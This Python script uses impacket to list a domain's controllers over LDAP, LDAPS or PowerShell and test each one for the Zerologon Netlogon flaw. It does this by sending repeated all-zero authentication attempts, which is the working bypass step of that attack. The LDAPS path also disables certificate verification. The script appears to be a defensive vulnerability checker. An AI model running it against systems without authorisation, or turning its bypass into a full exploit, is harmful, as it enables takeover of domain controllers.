#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport

import sys, socket
import getpass
import subprocess
import os
import argparse

LDAP_PORT = 389
LDAPS_PORT = 636
MAX_ATTEMPTS = 2000  # False negative chance: 0.04%
POWERSHELL = 'powershell'
LDAP = 'ldap'
LDAPS = 'ldaps'

requirements = {
    "cffi==1.14.2",
    "click==7.1.2",
    "cryptography==3.1",
    "dnspython==2.0.0",
    "Flask==1.1.2",
    "future==0.18.2",
    "impacket==0.9.21",
    "itsdangerous==1.1.0",
    "Jinja2==2.11.2",
    "MarkupSafe==1.1.1",
    "pyasn1==0.4.8",
    "pycparser==2.20",
    "pycryptodomex==3.9.8",
    "pyOpenSSL==19.1.0",
    "six==1.15.0",
    "Werkzeug==1.0.1",
}

linux = ["ldap3==2.8", "ldapdomaindump==0.9.3", "python-ldap==3.1.0"]


def install(packages):
    for package in packages:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])


def get_domain_controllers_with_ldap(domain, use_ldaps):
    import ldap
    user = input("User:")
    password = getpass.getpass()

    if use_ldaps:
        ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_NEVER)
        l = ldap.initialize("ldaps://{}:{}".format(domain, LDAPS_PORT))
        l.set_option(ldap.OPT_REFERRALS, 0)
        l.set_option(ldap.OPT_PROTOCOL_VERSION, 3)
        l.set_option(ldap.OPT_X_TLS_CACERTFILE, os.path.join('.', "cacert.pem"))
        l.set_option(ldap.OPT_X_TLS, ldap.OPT_X_TLS_DEMAND)
        l.set_option(ldap.OPT_X_TLS_DEMAND, True)
    else:
        l = ldap.initialize("ldap://{}:{}".format(domain, LDAP_PORT))

    try:
        l.bind_s(user, password)
    except:
        print("Couldn't bind with {} to {}".format(user, domain))
        sys.exit(1)

    # get all DCs in the domain
    base = "OU=Domain Controllers, dc=" + ",dc=".join(domain.split("."))
    scope = ldap.SCOPE_SUBTREE
    attrs = ["name", "dNSHostName"]
    # we retrieve all the DCs in the domain using this filter
    filter = "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
    res = l.search_s(base, scope, filter, attrs)
    domain_controller_names = [(r[1]['name'][0].decode("utf-8"), r[1]['dNSHostName'][0].decode("utf-8")) for r in res]
    return domain_controller_names


def get_domain_controllers_with_powershell():
    # get DC names
    dc_names = subprocess.check_output(
        'Powershell.exe -Command "& {Import-Module ActiveDirectory; Get-Addomaincontroller -filter * | foreach { $_.Name}}"',
        shell=True)
    result = dc_names.decode('utf-8')
    dc_names = result.strip().split('\r\n')

    # get DCs HostName
    dc_host_names = subprocess.check_output(
        'Powershell.exe -Command "& {Import-Module ActiveDirectory; Get-Addomaincontroller -filter * | foreach { $_.HostName}}"',
        shell=True)
    result = dc_host_names.decode('utf-8')
    dc_host_names = result.strip().split('\r\n')

    return list(zip(dc_names, dc_host_names))


def get_domain_controllers_in_domain(domain, mode):
    # in linux mode we get all the DCs in the domain by LDAP/LDAPS queries
    if mode == LDAP:
        domain_dcs_info = get_domain_controllers_with_ldap(domain, False)

    elif mode == LDAPS:
        domain_dcs_info = get_domain_controllers_with_ldap(domain, True)

    # windows mode - we get the DCs by powershell commands
    elif mode == POWERSHELL:
        domain_dcs_info = get_domain_controllers_with_powershell()

    else:
        print("mode is not valid!")
        sys.exit(1)

    print("The following Domain Controllers were found in {}: {}".format(domain, domain_dcs_info))
    return domain_dcs_info


def resolve_ip_from_dc_name(dc_name):
    return socket.getaddrinfo(dc_name, 80)[0][-1][0]


def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)


def try_zero_authenticate(dc_handle, dc_ip, target_computer,
                          channel=nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel):
    # Connect to the DC's Netlogon service.
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', channel, target_computer + '\x00', ciphertext, flags
        )

        # It worked!
        assert server_auth['ErrorCode'] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail("Unexpected error code from DC: {}.".format(ex.get_error_code()))
    except BaseException as ex:
        fail("Unexpected error: {}.".format(ex))


def perform_attack(dc_handle, dc_ip, target_computer, channel=nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    try:
        for attempt in range(0, MAX_ATTEMPTS):
            rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer, channel)

            if rpc_con == None:
                print('=', end='', flush=True)
            else:
                break

        if rpc_con:
            print('\nSuccess! {} can be fully compromised by a Zerologon attack.'.format(target_computer))
            return True
        else:
            print('\nAttack failed. Target is probably patched.')
            return False
    except Exception as e:
        print("Couldn't perform attack on {}".format(target_computer))
        return None


def get_mode(ldap, ldaps):
    if (ldap is False) and (ldaps is False):
        if sys.platform == 'win32':
            return POWERSHELL
        else:
            return LDAPS

    if (ldap is True) and (ldaps is False):
        return LDAP

    if (ldap is False) and (ldaps is True):
        return LDAPS

    print("please choose one mode!")
    sys.exit(1)


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("domain")
    parser.add_argument("--ldap", default=False, help="use LDAP", action="store_const", const=True)
    parser.add_argument("--ldaps", default=False, help="use LDAPS", action="store_const", const=True)
    parser.add_argument("--install_requirements", "-i", default=False,
                        help="install the requirements for the relevant OS", action="store_const", const=True)
    args = parser.parse_args()
    mode = get_mode(args.ldap, args.ldaps)

    # install the requirements if needed
    if args.install_requirements:
        install(requirements)

        if (sys.platform in ['linux', 'darwin']) or mode != POWERSHELL:
            install(linux)

    dcs_info = get_domain_controllers_in_domain(args.domain, mode)
    if len(dcs_info) == 0:
        print("Couldn't find any DC in the domain, please check the input")
        sys.exit(1)

    clean_dcs = []
    compromised_dcs = []

    # check for compromised DCs
    for dc_name, dns_host_name in dcs_info:
        try:
            dc_ip = resolve_ip_from_dc_name(dns_host_name)
        except:
            print("Couldn't resolve ip for {}, {}".format(dc_name, dns_host_name))
            continue

        print("testing {}, {}".format(dc_name, dc_ip))

        attack_status = perform_attack('\\\\' + dc_name, dc_ip, dc_name)
        if attack_status is True:
            compromised_dcs.append(dc_name)
        elif attack_status is False:
            clean_dcs.append(dc_name)
        else:
            continue

    if len(compromised_dcs) > 0:
        print("\nThe DCs {} are vulnerable to Zerologon attack".format(compromised_dcs))

    if len(clean_dcs):
        print("\nThe DCs {} are clean".format(clean_dcs))

